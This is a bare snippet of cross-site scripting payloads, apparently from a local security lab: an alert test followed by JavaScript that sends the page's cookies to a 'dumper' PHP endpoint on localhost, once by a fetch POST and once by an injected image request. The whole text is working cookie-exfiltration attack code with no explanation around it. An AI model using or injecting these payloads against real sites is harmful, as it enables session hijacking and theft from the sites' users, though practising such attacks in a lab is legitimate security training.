<script>alert(1)</script>

fetch('http://localhost:8080/seclab/helpers/dumper/dump.php', {
  method: 'post',
  body: JSON.stringify({
    data: document.cookie
  })
})

var img = document.createElement("img");
img.src = "http://localhost:8080/seclab/helpers/dumper/dump.php?q=" + document.cookie;
var src = document.getElementById("body");
src.appendChild(img);